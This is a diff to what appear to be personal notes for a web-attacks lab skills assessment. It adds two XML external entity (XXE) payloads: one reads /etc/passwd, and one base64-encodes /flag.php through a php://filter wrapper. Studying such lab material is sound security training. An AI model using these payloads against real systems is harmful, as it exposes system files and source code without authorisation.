@@ -109,3 +109,24 @@ php -S 0.0.0.0:8000
 ## Web Attacks - Skills Assessment
 
 >**Q. Try to escalate your privileges and exploit different vulnerabilities to read the flag at '/flag.php'.**
+
+```xml
+<!DOCTYPE test [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+            <root>
+            <name>&xxe;</name>
+            <details>test</details>
+            <date>2023-07-18</date>
+            </root>
+```
+```xml
+<!DOCTYPE test [
+  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/flag.php">
+]>
+            <root>
+            <name>&xxe;</name>
+            <details>test</details>
+            <date>2023-07-18</date>
+            </root>
+```
